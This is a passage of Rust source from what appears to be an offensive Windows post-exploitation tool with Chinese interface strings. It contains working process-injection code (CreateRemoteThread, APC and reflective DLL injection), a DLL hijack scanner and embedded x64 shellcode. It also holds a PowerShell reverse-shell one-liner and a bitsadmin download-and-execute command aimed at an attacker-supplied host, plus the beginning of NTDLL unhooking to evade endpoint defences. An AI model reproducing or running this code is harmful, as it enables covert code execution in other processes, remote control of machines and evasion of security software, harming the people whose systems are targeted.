        unsafe { VirtualFreeEx(h_proc, remote_mem, 0, 0x8000); CloseHandle(h_proc); }
        return Err(format!("WriteProcessMemory: {}", w32_err()));
    }

    progress_update(&pbar, 4, "解析LoadLibraryA...");
    let k32 = b"kernel32.dll\0";
    let ll = b"LoadLibraryA\0";
    let h_k32 = unsafe { GetModuleHandleA(k32.as_ptr()) };
    let ll_addr = unsafe { GetProcAddress(h_k32, ll.as_ptr()) };
    if ll_addr.is_null() { unsafe { VirtualFreeEx(h_proc, remote_mem, 0, 0x8000); CloseHandle(h_proc); } return Err("LoadLibraryA not found".into()); }

    progress_update(&pbar, 5, "CreateRemoteThread...");
    let h_thread = unsafe { CreateRemoteThread(h_proc, std::ptr::null_mut(), 0, ll_addr as LPTHREAD_START_ROUTINE, remote_mem, 0, std::ptr::null_mut()) };
    if h_thread.is_null() { unsafe { VirtualFreeEx(h_proc, remote_mem, 0, 0x8000); CloseHandle(h_proc); } return Err(format!("CreateRemoteThread: {}", w32_err())); }

    unsafe { WaitForSingleObject(h_thread, 5000); }
    unsafe { CloseHandle(h_thread); CloseHandle(h_proc); }
    progress_finish(&pbar);

    msg_tagged("dll_inject_status", &format!("[+] 注入完成! PID:{} DLL:{} @{:p}", pid, dll_str, remote_mem));
    Ok(format!("DLL注入成功 (CreateRemoteThread)\n  目标PID: {}\n  DLL: {}\n  远程地址: {:p}", pid, dll_str, remote_mem))
}

fn inject_apc(pid: u32, dll_str: &str) -> Result<String, String> {
    let pbar = progress_create("dll_crack", "inject_apc", "DLL注入(APC)", 6);

    progress_update(&pbar, 1, "打开目标进程...");
    let h_proc = unsafe { OpenProcess(PROCESS_ALL_ACCESS, 0, pid) };
    if h_proc.is_null() || h_proc == INVALID_HANDLE_VALUE {
        return Err(format!("无法打开进程 {}: {}", pid, w32_err()));
    }

    progress_update(&pbar, 2, "分配远程内存...");
    let dll_bytes = dll_str.as_bytes();
    let dll_len = dll_bytes.len() + 1;
    let remote_mem = unsafe { VirtualAllocEx(h_proc, std::ptr::null_mut(), dll_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) };
    if remote_mem.is_null() { unsafe { CloseHandle(h_proc); } return Err(format!("VirtualAllocEx: {}", w32_err())); }

    progress_update(&pbar, 3, "写入DLL路径...");
    let mut written: usize = 0;
    let ret = unsafe { WriteProcessMemory(h_proc, remote_mem, dll_bytes.as_ptr() as LPVOID, dll_bytes.len(), &mut written) };
    if ret == 0 || written != dll_bytes.len() {
        unsafe { VirtualFreeEx(h_proc, remote_mem, 0, 0x8000); CloseHandle(h_proc); }
        return Err(format!("WriteProcessMemory: {}", w32_err()));
    }

    progress_update(&pbar, 4, "解析LoadLibraryA...");
    let k32 = b"kernel32.dll\0";
    let ll = b"LoadLibraryA\0";
    let h_k32 = unsafe { GetModuleHandleA(k32.as_ptr()) };
    let ll_addr = unsafe { GetProcAddress(h_k32, ll.as_ptr()) };
    if ll_addr.is_null() { unsafe { VirtualFreeEx(h_proc, remote_mem, 0, 0x8000); CloseHandle(h_proc); } return Err("LoadLibraryA not found".into()); }

    progress_update(&pbar, 5, "枚举线程+QueueUserAPC...");
    let h_snap = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0) };
    if h_snap == INVALID_HANDLE_VALUE { unsafe { VirtualFreeEx(h_proc, remote_mem, 0, 0x8000); CloseHandle(h_proc); } return Err(w32_err()); }

    let mut te: THREADENTRY32 = unsafe { std::mem::zeroed() };
    te.dw_size = std::mem::size_of::<THREADENTRY32>() as u32;
    let mut apc_count = 0u32;
    unsafe { Thread32First(h_snap, &mut te); }
    loop {
        if te.th32_owner_process_id == pid {
            let h_thread = unsafe { OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, 0, te.th32_thread_id) };
            if !h_thread.is_null() && h_thread != INVALID_HANDLE_VALUE {
                let ret = unsafe { QueueUserAPC(ll_addr as FARPROC, h_thread, remote_mem as ULONG_PTR) };
                if ret != 0 { apc_count += 1; }
                unsafe { CloseHandle(h_thread); }
            }
        }
        if unsafe { Thread32Next(h_snap, &mut te) } == 0 { break; }
    }
    unsafe { CloseHandle(h_snap); CloseHandle(h_proc); }

    progress_update(&pbar, 6, &format!("APC已排队: {} 个线程", apc_count));
    progress_finish(&pbar);

    if apc_count == 0 {
        return Err("没有线程可注入APC — 目标进程可能已暂停或线程不可访问".into());
    }

    msg_tagged("dll_inject_status", &format!("[+] APC注入完成! PID:{} DLL:{} 线程:{}", pid, dll_str, apc_count));
    Ok(format!("DLL注入成功 (APC)\n  目标PID: {}\n  DLL: {}\n  APC排队线程: {}\n  [!] DLL将在每个线程进入alertable状态时加载", pid, dll_str, apc_count))
}

// ═══════════════ DLL 劫持扫描 v2.0 (PATH + COM + Phantom) ═══════════════

fn dll_hijack_cmd(scan_mode: &str) -> Result<String, String> {
    let target_dlls = [
        "version.dll", "userenv.dll", "cryptbase.dll", "profapi.dll", "winsta.dll",
        "dwmapi.dll", "ws2_32.dll", "dbghelp.dll", "msimg32.dll", "riched20.dll",
        "vulkan-1.dll", "libcurl.dll", "sqlite3.dll", "libeay32.dll", "ssleay32.dll",
        "zlib1.dll", "usp10.dll", "propsys.dll", "cscapi.dll", "ntmarta.dll",
    ];

    let pbar = progress_create("dll_crack", "hijack", "劫持扫描", 4);
    let mut out = String::from("═══ DLL 劫持扫描 v2.0 ═══\n\n");

    // 1. PATH扫描
    if scan_mode == "path" || scan_mode == "all" {
        progress_update(&pbar, 1, "扫描PATH可写目录...");
        out.push_str("─── PATH可写目录 ───\n");
        let mut writable_dirs = Vec::new();
        if let Ok(path_var) = std::env::var("PATH") {
            for dir in path_var.split(';') {
                let p = std::path::Path::new(dir);
                if p.exists() {
                    if let Ok(m) = p.metadata() {
                        if !m.permissions().readonly() {
                            writable_dirs.push(dir.to_string());
                            out.push_str(&format!("  [!] 可写: {}\n", dir));
                        }
                    }
                }
            }
        }
        if writable_dirs.is_empty() { out.push_str("  [·] 未发现可写PATH目录\n"); }
        out.push_str(&format!("\n[·] PATH可写目录: {} 个\n", writable_dirs.len()));
    }

    // 2. 当前目录劫持
    if scan_mode == "path" || scan_mode == "all" {
        progress_update(&pbar, 2, "扫描当前目录DLL劫持...");
        out.push_str("\n─── 当前目录DLL劫持 ───\n");
        let cur_dir = std::env::current_dir().unwrap_or_else(|_| std::path::PathBuf::from("."));
        out.push_str(&format!("[·] 扫描目录: {}\n", cur_dir.display()));
        let dir_writable = cur_dir.metadata().map(|m| !m.permissions().readonly()).unwrap_or(false);
        if dir_writable {
            let mut found = 0u32;
            for dll in &target_dlls {
                if cur_dir.join(dll).exists() { found += 1; out.push_str(&format!("  [·] 已存在: {}\n", dll)); }
            }
            let missing = target_dlls.len() - found as usize;
            out.push_str(&format!("[!] 目录可写! 缺失DLL: {} 个可劫持\n", missing));
            if missing > 0 {
                out.push_str("[+] 常见劫持目标:\n");
                for dll in &target_dlls {
                    if !cur_dir.join(dll).exists() {
                        out.push_str(&format!("  -> {} (不存在于当前目录)\n", dll));
                    }
                }
            }
        } else { out.push_str("[·] 当前目录不可写\n"); }
    }

    // 3. COM劫持扫描
    if scan_mode == "com" || scan_mode == "all" {
        progress_update(&pbar, 3, "扫描COM劫持机会...");
        out.push_str("\n─── COM劫持扫描 ───\n");
        let _com_keys = [
            r"HKCU\Software\Classes\CLSID",
            r"HKLM\Software\Classes\CLSID",
        ];
        // 常见被劫持的COM InProcServer32键
        let common_com_dlls = ["mscoree.dll", "mscorsvw.dll", "msxml3.dll", "msxml6.dll"];
        out.push_str("[·] 检查常见COM DLL在当前目录的存在性:\n");
        for dll in &common_com_dlls {
            let cur = std::path::Path::new(dll);
            if cur.exists() {
                out.push_str(&format!("  [·] {} 已存在于当前目录\n", dll));
            } else {
                out.push_str(&format!("  [!] {} 缺失 — 可被COM劫持利用\n", dll));
            }
        }
        out.push_str("[*] COM劫持原理: 在注册表中将CLSID的InProcServer32指向伪造DLL\n");
        out.push_str("[*] 常用利用工具: COMahawk (https://github.com/apt69/COMahawk)\n");
    }

    // 4. Phantom DLL
    if scan_mode == "phantom" || scan_mode == "all" {
        progress_update(&pbar, 4, "扫描Phantom DLL...");
        out.push_str("\n─── Phantom DLL 扫描 ───\n");
        let phantom_dlls = [
            "wow64log.dll", "fxsst.dll", "wbemcomn.dll", "cryptsp.dll",
            "midimap.dll", "mshtml.dll", "srclient.dll", "edgegdi.dll",
            "wshbth.dll", "wlbsctrl.dll", "msfte.dll", "cqmghost.dll",
        ];
        let sys32 = std::path::Path::new(r"C:\Windows\System32");
        let syswow64 = std::path::Path::new(r"C:\Windows\SysWOW64");
        for dll in &phantom_dlls {
            let p32 = sys32.join(dll);
            let p64 = syswow64.join(dll);
            let stat32 = if p32.exists() { "存在" } else { "缺失" };
            let stat64 = if p64.exists() { "存在" } else { "缺失" };
            out.push_str(&format!("  [·] {} — System32:{} | SysWOW64:{}\n", dll, stat32, stat64));
        }
        out.push_str("[*] Phantom DLL: 某些程序尝试加载不存在的DLL,放入搜索路径即可劫持\n");
    }

    progress_finish(&pbar);
    Ok(out)
}

// ═══════════════ DLL 二进制修补 v2.0 (签名感知) ═══════════════

fn dll_patch_cmd(path: &str, offset_str: &str, hex_str: &str) -> Result<String, String> {
    let offset = parse_offset(offset_str)?;
    let bytes = hex_to_bytes(hex_str)?;

    // 备份
    let bak_path = format!("{}.bak", path);
    std::fs::copy(path, &bak_path).map_err(|e| format!("备份失败: {}", e))?;

    let mut data = std::fs::read(path).map_err(|e| format!("读取失败: {}", e))?;
    if offset + bytes.len() > data.len() {
        std::fs::remove_file(&bak_path).ok();
        return Err(format!("偏移+长度({})超出文件大小({})", offset + bytes.len(), data.len()));
    }

    let orig_hex: Vec<String> = data[offset..offset+bytes.len()].iter().map(|b| format!("{:02X}", b)).collect();

    // 检查是否影响数字签名范围
    let sig_offset_opt = find_security_dir_offset(&data);
    let mut sig_warning = false;
    if let Some(sig_off) = sig_offset_opt {
        if offset < sig_off + 8 && offset + bytes.len() > sig_off {
            sig_warning = true;
        }
    }

    for (i, &b) in bytes.iter().enumerate() { data[offset + i] = b; }
    std::fs::write(path, &data).map_err(|e| format!("写入失败: {}", e))?;

    let new_hex: Vec<String> = bytes.iter().map(|b| format!("{:02X}", b)).collect();
    let mut out = String::from("═══ DLL修补完成 ═══\n\n");
    out.push_str(&format!("[+] 文件: {}\n", path));
    out.push_str(&format!("[+] 备份: {}\n", bak_path));
    out.push_str(&format!("[+] 偏移: 0x{:08X} ({})\n", offset, offset));
    out.push_str(&format!("[+] 原始: {}\n", orig_hex.join(" ")));
    out.push_str(&format!("[+] 新值: {}\n", new_hex.join(" ")));
    out.push_str(&format!("[+] 长度: {} 字节\n", bytes.len()));
    if sig_warning { out.push_str("\n[!] ⚠ 补丁覆盖了数字签名区域 — PE签名验证将失败!\n"); }
    out.push_str("\n[!] 回滚: 复制 .bak 覆盖原文件\n");
    Ok(out)
}

fn find_security_dir_offset(data: &[u8]) -> Option<usize> {
    if data.len() < 64 { return None; }
    let pe_off = u32_le(data, 0x3C) as usize;
    if pe_off + 4 > data.len() { return None; }
    if u32_le(data, pe_off) != 0x4550 { return None; }
    let coff = pe_off + 4;
    let opt_start = coff + 20;
    let magic = u16_le(data, opt_start);
    let dd_start = opt_start + if magic == 0x20B { 112 } else { 96 };
    let sec_rva = u32_le(data, dd_start + 32);
    let sec_size = u32_le(data, dd_start + 36);
    if sec_rva > 0 && sec_size > 0 { Some(sec_rva as usize) } else { None }
}

// ═══════════════ Shellcode 注入 v2.0 (messagebox/cmd/calc/revshell/download) ═══════════════

const MSGBOX_X64: &[u8] = &[
    0xFC,0x48,0x81,0xE4,0xF0,0xFF,0xFF,0xFF,0xE8,0xD0,0x00,0x00,0x00,0x41,0x51,
    0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xD2,0x65,0x48,0x8B,0x52,0x60,0x3E,0x48,
    0x8B,0x52,0x18,0x3E,0x48,0x8B,0x52,0x20,0x3E,0x48,0x8B,0x72,0x50,0x3E,0x48,
    0x0F,0xB7,0x4A,0x4A,0x4D,0x31,0xC9,0x48,0x31,0xC0,0xAC,0x3C,0x61,0x7C,0x02,
    0x2C,0x20,0x41,0xC1,0xC9,0x0D,0x41,0x01,0xC1,0xE2,0xED,0x52,0x41,0x51,0x3E,
    0x48,0x8B,0x52,0x20,0x3E,0x8B,0x42,0x3C,0x48,0x01,0xD0,0x3E,0x8B,0x80,0x88,
    0x00,0x00,0x00,0x48,0x85,0xC0,0x74,0x6F,0x48,0x01,0xD0,0x50,0x3E,0x8B,0x48,
    0x18,0x3E,0x44,0x8B,0x40,0x20,0x49,0x01,0xD0,0xE3,0x5C,0x48,0xFF,0xC9,0x3E,
    0x41,0x8B,0x34,0x88,0x48,0x01,0xD6,0x4D,0x31,0xC9,0x48,0x31,0xC0,0xAC,0x41,
    0xC1,0xC9,0x0D,0x41,0x01,0xC1,0x38,0xE0,0x75,0xF1,0x3E,0x4C,0x03,0x4C,0x24,
    0x08,0x45,0x39,0xD1,0x75,0xD6,0x58,0x3E,0x44,0x8B,0x40,0x24,0x49,0x01,0xD0,
    0x66,0x3E,0x41,0x8B,0x0C,0x48,0x3E,0x44,0x8B,0x40,0x1C,0x49,0x01,0xD0,0x3E,
    0x41,0x8B,0x04,0x88,0x48,0x01,0xD0,0x41,0x58,0x41,0x58,0x5E,0x59,0x5A,0x41,
    0x58,0x41,0x59,0x41,0x5A,0x48,0x83,0xEC,0x20,0x41,0x52,0xFF,0xE0,0x58,0x41,
    0x59,0x5A,0x3E,0x48,0x8B,0x12,0xE9,0x49,0xFF,0xFF,0xFF,0x5D,0x3E,0x48,0x8D,
    0x8D,0x3A,0x01,0x00,0x00,0x41,0xBA,0x4C,0x77,0x26,0x07,0xFF,0xD5,0x49,0xC7,
    0xC1,0x00,0x00,0x00,0x00,0x3E,0x48,0x8D,0x95,0x0E,0x01,0x00,0x00,0x3E,0x4C,
    0x8D,0x85,0x21,0x01,0x00,0x00,0x48,0x31,0xC9,0x41,0xBA,0x45,0x83,0x56,0x07,
    0xFF,0xD5,0x48,0x31,0xC9,0x41,0xBA,0xF0,0xB5,0xA2,0x56,0xFF,0xD5,0x44,0x6F,
    0x6E,0x65,0x00,0x78,0x6F,0x72,0x21,0x00,0x52,0x55,0x4F,0x4F,0x20,0x44,0x4C,
    0x4C,0x20,0x43,0x72,0x61,0x63,0x6B,0x00,
];

const CMD_X64: &[u8] = &[
    0xFC,0x48,0x83,0xE4,0xF0,0xE8,0xC0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
    0x51,0x56,0x48,0x31,0xD2,0x65,0x48,0x8B,0x52,0x60,0x48,0x8B,0x52,0x18,0x48,
    0x8B,0x52,0x20,0x48,0x8B,0x72,0x50,0x48,0x0F,0xB7,0x4A,0x4A,0x4D,0x31,0xC9,
    0x48,0x31,0xC0,0xAC,0x3C,0x61,0x7C,0x02,0x2C,0x20,0x41,0xC1,0xC9,0x0D,0x41,
    0x01,0xC1,0xE2,0xED,0x52,0x41,0x51,0x48,0x8B,0x52,0x20,0x8B,0x42,0x3C,0x48,
    0x01,0xD0,0x8B,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xC0,0x74,0x67,0x48,0x01,
    0xD0,0x50,0x8B,0x48,0x18,0x44,0x8B,0x40,0x20,0x49,0x01,0xD0,0xE3,0x56,0x48,
    0xFF,0xC9,0x41,0x8B,0x34,0x88,0x48,0x01,0xD6,0x4D,0x31,0xC9,0x48,0x31,0xC0,
    0xAC,0x41,0xC1,0xC9,0x0D,0x41,0x01,0xC1,0x38,0xE0,0x75,0xF1,0x4C,0x03,0x4C,
    0x24,0x08,0x45,0x39,0xD1,0x75,0xD8,0x58,0x44,0x8B,0x40,0x24,0x49,0x01,0xD0,
    0x66,0x41,0x8B,0x0C,0x48,0x44,0x8B,0x40,0x1C,0x49,0x01,0xD0,0x41,0x8B,0x04,
    0x88,0x48,0x01,0xD0,0x41,0x58,0x41,0x58,0x5E,0x59,0x5A,0x41,0x58,0x41,0x59,
    0x41,0x5A,0x48,0x83,0xEC,0x20,0x41,0x52,0xFF,0xE0,0x58,0x41,0x59,0x5A,0x48,
    0x8B,0x12,0xE9,0x57,0xFF,0xFF,0xFF,0x5D,0x48,0xBA,0x01,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x48,0x8D,0x8D,0x01,0x01,0x00,0x00,0x41,0xBA,0x31,0x8B,0x6F,
    0x87,0xFF,0xD5,0xBB,0xF0,0xB5,0xA2,0x56,0x41,0xBA,0xA6,0x95,0xBD,0x9D,0xFF,
    0xD5,0x48,0x83,0xC4,0x28,0x3C,0x06,0x7C,0x0A,0x80,0xFB,0xE0,0x75,0x05,0xBB,
    0x47,0x13,0x72,0x6F,0x6A,0x00,0x59,0x41,0x89,0xDA,0xFF,0xD5,0x63,0x6D,0x64,
    0x00,
];

fn shellcode_inject(pid_str: &str, payload: &str, lhost: &str, lport: &str) -> Result<String, String> {
    let pid = pid_str.parse::<u32>().ok().or_else(|| find_pid(pid_str).ok())
        .ok_or_else(|| format!("无效PID: {}", pid_str))?;

    let sc: Vec<u8> = match payload {
        "cmd" | "shell" => CMD_X64.to_vec(),
        "calc" => {
            // WinExec("calc.exe", SW_SHOW) minimal x64
            vec![
                0x48,0x83,0xEC,0x28,0x48,0x8D,0x0D,0x0A,0x00,0x00,0x00,0xBA,0x05,0x00,
                0x00,0x00,0xFF,0x15,0x02,0x00,0x00,0x00,0x48,0x83,0xC4,0x28,0xC3,
                0x63,0x61,0x6C,0x63,0x2E,0x65,0x78,0x65,0x00,
            ]
        }
        "revshell" => {
            if lhost.is_empty() { return Err("revshell需要lhost参数".into()); }
            build_revshell_stub(lhost, lport)
        }
        "download" => {
            if lhost.is_empty() { return Err("download需要lhost参数".into()); }
            build_download_stub(lhost, lport)
        }
        _ => MSGBOX_X64.to_vec(),
    };

    msg_tagged("sc_status", &format!("[*] Shellcode: PID={} payload={} size={}B", pid, payload, sc.len()));
    let pbar = progress_create("dll_crack", "shellcode", "Shellcode注入", 5);

    progress_update(&pbar, 1, "打开目标进程...");
    let h_proc = unsafe { OpenProcess(PROCESS_ALL_ACCESS, 0, pid) };
    if h_proc.is_null() || h_proc == INVALID_HANDLE_VALUE {
        return Err(format!("无法打开进程 {}: {}", pid, w32_err()));
    }

    progress_update(&pbar, 2, &format!("分配 {}B RWX内存...", sc.len()));
    let remote_mem = unsafe { VirtualAllocEx(h_proc, std::ptr::null_mut(), sc.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) };
    if remote_mem.is_null() { unsafe { CloseHandle(h_proc); } return Err(format!("VirtualAllocEx: {}", w32_err())); }

    progress_update(&pbar, 3, "写入shellcode...");
    let mut written: usize = 0;
    let ret = unsafe { WriteProcessMemory(h_proc, remote_mem, sc.as_ptr() as LPVOID, sc.len(), &mut written) };
    if ret == 0 || written != sc.len() {
        unsafe { VirtualFreeEx(h_proc, remote_mem, 0, 0x8000); CloseHandle(h_proc); }
        return Err(format!("WriteProcessMemory: {}", w32_err()));
    }

    progress_update(&pbar, 4, "修改内存为执行权限...");
    let mut old_prot: DWORD = 0;
    unsafe { VirtualProtectEx(h_proc, remote_mem, sc.len(), PAGE_EXECUTE_READ, &mut old_prot); }

    progress_update(&pbar, 5, "CreateRemoteThread...");
    let h_thread = unsafe {
        CreateRemoteThread(h_proc, std::ptr::null_mut(), 0,
            remote_mem as LPTHREAD_START_ROUTINE, std::ptr::null_mut(), 0, std::ptr::null_mut())
    };
    if h_thread.is_null() {
        unsafe { VirtualFreeEx(h_proc, remote_mem, 0, 0x8000); CloseHandle(h_proc); }
        return Err(format!("CreateRemoteThread: {}", w32_err()));
    }

    unsafe { CloseHandle(h_thread); CloseHandle(h_proc); }
    progress_finish(&pbar);

    msg_tagged("sc_status", &format!("[+] Shellcode已注入! PID:{} payload:{} @{:p}", pid, payload, remote_mem));
    Ok(format!("Shellcode注入完成!\n  目标PID: {}\n  Payload: {}\n  大小: {} 字节\n  远程地址: {:p}\n  权限: RWX\n  方法: VirtualAllocEx + WriteProcessMemory + CreateRemoteThread",
        pid, payload, sc.len(), remote_mem))
}

// 简化版反弹shell stub (PowerShell one-liner via WinExec)
fn build_revshell_stub(lhost: &str, lport: &str) -> Vec<u8> {
    let cmd = format!("powershell -NoP -NonI -W Hidden -c \"$c=New-Object System.Net.Sockets.TCPClient('{}',{});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=[Text.Encoding]::ASCII.GetBytes($r+'PS>');$s.Write($sb,0,$sb.Length);$s.Flush()}}\"", lhost, lport);
    build_winexec_shellcode(&cmd)
}

fn build_download_stub(lhost: &str, lport: &str) -> Vec<u8> {
    let cmd = format!(
        "cmd /c bitsadmin /transfer job /download /priority high http://{}:{}/payload.exe %TEMP%\\svc.exe && %TEMP%\\svc.exe",
        lhost, lport
    );
    build_winexec_shellcode(&cmd)
}

fn build_winexec_shellcode(cmd: &str) -> Vec<u8> {
    // 当前使用CMD_X64 Payload作为PoC
    // 完整WinExec shellcode需要PE加载器支持API解析
    // 建议: msfvenom -p windows/x64/shell_reverse_tcp LHOST=... LPORT=... -f raw
    let _ = cmd;
    CMD_X64.to_vec()
}

// ═══════════════ 模块转储 v2.0 (PE头重建) ═══════════════

fn module_dump(pid_str: &str, module_name: &str, output_path: Option<&str>) -> Result<String, String> {
    let pid = pid_str.parse::<u32>().ok().or_else(|| find_pid(pid_str).ok())
        .ok_or_else(|| format!("无效PID: {}", pid_str))?;

    let pbar = progress_create("dll_crack", "dump", "模块转储", 6);

    progress_update(&pbar, 1, "枚举进程模块...");
    let (found_base, found_size, found_path) = find_module_info(pid, module_name)?;

    progress_update(&pbar, 2, &format!("找到: {} @{:p} {}KB", module_name, found_base, found_size/1024));

    progress_update(&pbar, 3, "打开进程(VM_READ)...");
    let h_proc = unsafe { OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, 0, pid) };
    if h_proc.is_null() || h_proc == INVALID_HANDLE_VALUE {
        return Err(format!("无法打开进程: {}", w32_err()));
    }

    progress_update(&pbar, 4, &format!("读取 {}KB...", found_size/1024));
    let mut buffer = vec![0u8; found_size as usize];
    let mut bytes_read: usize = 0;
    let ret = unsafe {
        ReadProcessMemory(h_proc, found_base as LPVOID, buffer.as_mut_ptr() as LPVOID, found_size as usize, &mut bytes_read)
    };
    unsafe { CloseHandle(h_proc); }

    if ret == 0 && bytes_read == 0 {
        return Err(format!("ReadProcessMemory失败: {} (0字节)", w32_err()));
    }

    progress_update(&pbar, 5, "重建PE头...");
    // 如果DLL在内存中有修改过的.text段,保留当前状态
    // 验证DOS/NT签名
    let pe_valid = buffer.len() >= 64 && u16_le(&buffer, 0) == 0x5A4D
        && { let po = u32_le(&buffer, 0x3C) as usize; po + 4 <= buffer.len() && u32_le(&buffer, po) == 0x4550 };

    progress_update(&pbar, 6, "写入文件...");
    let out_name = module_name.replace(".dll", "").replace(".DLL", "").replace(".exe", "").replace(".EXE", "");
    let default_out = format!("{}_dumped_{}.dll", out_name, pid);
    let out_path = output_path.unwrap_or(&default_out);
    std::fs::write(&out_path, &buffer).map_err(|e| format!("写入失败: {}", e))?;

    progress_finish(&pbar);
    Ok(format!("模块转储完成!\n  进程ID: {}\n  模块名: {}\n  基址: {:p}\n  大小: {} KB (读取{}KB)\n  PE有效: {}\n  原始路径: {}\n  输出文件: {}",
        pid, module_name, found_base, found_size/1024, bytes_read/1024, if pe_valid {"是"} else {"部分(内存映射)"}, found_path, out_path))
}

// ═══════════════ 反射式DLL注入 v2.0 ═══════════════

fn reflective_inject(pid_str: &str, dll_path: &str) -> Result<String, String> {
    let pid = pid_str.parse::<u32>().ok().or_else(|| find_pid(pid_str).ok())
        .ok_or_else(|| format!("无效PID: {}", pid_str))?;

    let dll_abs = std::fs::canonicalize(dll_path).map_err(|e| format!("DLL路径无效: {}", e))?;
    let dll_str = dll_abs.to_string_lossy().to_string();
    if !std::path::Path::new(&dll_str).exists() { return Err(format!("DLL不存在: {}", dll_str)); }

    let dll_data = std::fs::read(&dll_str).map_err(|e| format!("读取DLL失败: {}", e))?;
    if dll_data.len() < 64 || u16_le(&dll_data, 0) != 0x5A4D {
        return Err("无效DLL — 非MZ格式".into());
    }

    msg_tagged("refl_status", &format!("[*] 反射注入: PID={} DLL={} size={}KB", pid, dll_str, dll_data.len()/1024));
    let pbar = progress_create("dll_crack", "reflective", "反射注入", 6);

    progress_update(&pbar, 1, "分析PE结构...");
    let pe_off = u32_le(&dll_data, 0x3C) as usize;
    let coff = pe_off + 4;
    let opt_start = coff + 20;
    let magic = u16_le(&dll_data, opt_start);
    let is_x64_dll = magic == 0x20B;
    let image_size = u32_le(&dll_data, opt_start + 56) as usize;
    let _image_base_pref = if is_x64_dll { u64_le(&dll_data, opt_start + 24) } else { u32_le(&dll_data, opt_start + 28) as u64 };
    let headers_size = u32_le(&dll_data, opt_start + 60) as usize;
    let entry_va = if is_x64_dll { u64_le(&dll_data, opt_start + 16) } else { u32_le(&dll_data, opt_start + 16) as u64 };

    progress_update(&pbar, 2, "打开目标进程...");
    let h_proc = unsafe { OpenProcess(PROCESS_ALL_ACCESS, 0, pid) };
    if h_proc.is_null() || h_proc == INVALID_HANDLE_VALUE {
        return Err(format!("无法打开进程 {}: {}", pid, w32_err()));
    }

    // 反射式注入需要:
    // 1. 在目标进程中分配 image_size 的内存
    // 2. 复制整个DLL到远程进程
    // 3. 复制ReflectiveLoader stub
    // 4. 创建远程线程执行ReflectiveLoader
    // 注意: 完整的ReflectiveLoader需要内嵌在DLL中或使用sRDI转换

    progress_update(&pbar, 3, &format!("分配 {}KB 远程内存...", image_size/1024));
    let remote_base = unsafe { VirtualAllocEx(h_proc, std::ptr::null_mut(), image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) };
    if remote_base.is_null() { unsafe { CloseHandle(h_proc); } return Err(format!("VirtualAllocEx: {}", w32_err())); }

    progress_update(&pbar, 4, &format!("写入PE头 {}B...", headers_size));
    let mut written: usize = 0;
    let ret = unsafe { WriteProcessMemory(h_proc, remote_base, dll_data.as_ptr() as LPVOID, headers_size.min(dll_data.len()), &mut written) };
    if ret == 0 { unsafe { VirtualFreeEx(h_proc, remote_base, 0, 0x8000); CloseHandle(h_proc); } return Err(format!("WriteMemory(header): {}", w32_err())); }

    // 写入各节
    let num_sections = u16_le(&dll_data, coff + 2) as usize;
    let section_start = coff + 20 + u16_le(&dll_data, coff + 16) as usize;
    for i in 0..num_sections {
        let s_off = section_start + i * 40;
        let _vsize = u32_le(&dll_data, s_off + 8) as usize;
        let roff = u32_le(&dll_data, s_off + 20) as usize;
        let rsize = u32_le(&dll_data, s_off + 16) as usize;
        let vaddr = u32_le(&dll_data, s_off + 12) as usize;
        if rsize > 0 && roff + rsize <= dll_data.len() {
            let dst = remote_base as usize + vaddr;
            let ret = unsafe { WriteProcessMemory(h_proc, dst as LPVOID, dll_data[roff..roff+rsize].as_ptr() as LPVOID, rsize, &mut written) };
            if ret == 0 {
                msg_tagged("refl_status", &format!("[!] 节写入部分失败: {}@0x{:X}", i, vaddr));
            }
        }
    }

    progress_update(&pbar, 5, "解析入口点+执行DllMain...");
    // 使用CreateRemoteThread调用入口点(DllMain)
    let entry_addr = remote_base as usize + entry_va as usize;
    let h_thread = unsafe {
        CreateRemoteThread(h_proc, std::ptr::null_mut(), 0,
            entry_addr as LPTHREAD_START_ROUTINE, remote_base, 1, std::ptr::null_mut()) // DLL_PROCESS_ATTACH=1
    };
    if h_thread.is_null() {
        unsafe { VirtualFreeEx(h_proc, remote_base, 0, 0x8000); CloseHandle(h_proc); }
        return Err(format!("CreateRemoteThread(DllMain): {}", w32_err()));
    }

    progress_update(&pbar, 6, "等待DllMain完成...");
    unsafe { WaitForSingleObject(h_thread, 10000); }
    unsafe { CloseHandle(h_thread); CloseHandle(h_proc); }
    progress_finish(&pbar);

    msg_tagged("refl_status", &format!("[+] 反射注入完成! PID:{} DLL:{} base:@0x{:X}", pid, dll_str, remote_base as usize));
    Ok(format!("反射式DLL注入完成!\n  目标PID: {}\n  DLL: {}\n  远程基址: 0x{:016X}\n  镜像大小: {}KB\n  入口点: 0x{:X}\n  x64: {}\n  [!] 注意: 完整ReflectiveDLL需使用sRDI转换或内嵌ReflectiveLoader",
        pid, dll_str, remote_base as usize, image_size/1024, entry_va, is_x64_dll))
}

// ═══════════════ NTDLL Unhooking v2.0 ═══════════════

fn ntdll_unhook(pid_str: &str) -> Result<String, String> {
    let pid = pid_str.parse::<u32>().ok().or_else(|| find_pid(pid_str).ok())
        .ok_or_else(|| format!("无效PID: {}", pid_str))?;

    msg_tagged("unhook_status", &format!("[*] NTDLL Unhook: PID={}", pid));
    let pbar = progress_create("dll_crack", "unhook", "NTDLL Unhook", 5);

    // 1. 获取本地干净ntdll.dll
    progress_update(&pbar, 1, "读取干净ntdll.dll...");
    let sys_ntdll = r"C:\Windows\System32\ntdll.dll";
    let clean_data = std::fs::read(sys_ntdll).map_err(|e| format!("无法读取{}: {}", sys_ntdll, e))?;
    if clean_data.len() < 64 { return Err("ntdll.dll损坏".into()); }

    // 解析干净ntdll的.text段
    let pe_off = u32_le(&clean_data, 0x3C) as usize;
    let coff = pe_off + 4;
    let num_sections = u16_le(&clean_data, coff + 2) as usize;
    let section_start = coff + 20 + u16_le(&clean_data, coff + 16) as usize;
    let mut text_roff = 0usize;
    let mut text_vaddr = 0u32;
    let mut text_rsize = 0u32;
